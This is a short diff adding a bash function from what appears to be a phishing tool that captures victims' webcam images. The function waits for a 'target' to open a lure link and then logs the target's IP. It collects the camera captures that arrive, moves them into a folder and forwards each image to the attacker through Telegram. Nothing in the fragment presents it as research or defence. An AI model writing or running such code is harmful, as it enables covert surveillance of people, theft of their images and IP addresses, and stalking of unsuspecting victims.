@@ -1,0 +1,32 @@
+checkfound() {
+
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+while [ true ]; do
+
+if [[ -e "ip.txt" ]]; then
+  printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+  catch_ip
+  rm -rf ip.txt
+fi
+
+sleep 0.5
+
+if [[ -e "Log.log" ]]; then
+  printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+  mkdir -p captured_files/new > /dev/null 2>&1 || true
+
+  for img in *.png; do
+    if [[ -f "$img" ]]; then
+      mv "$img" captured_files/new/
+      send_to_telegram "captured_files/new/$img" "📸 Cam capture from target!"
+    fi
+  done
+
+  rm -f Log.log
+fi
+
+sleep 0.5
+done
+
+}
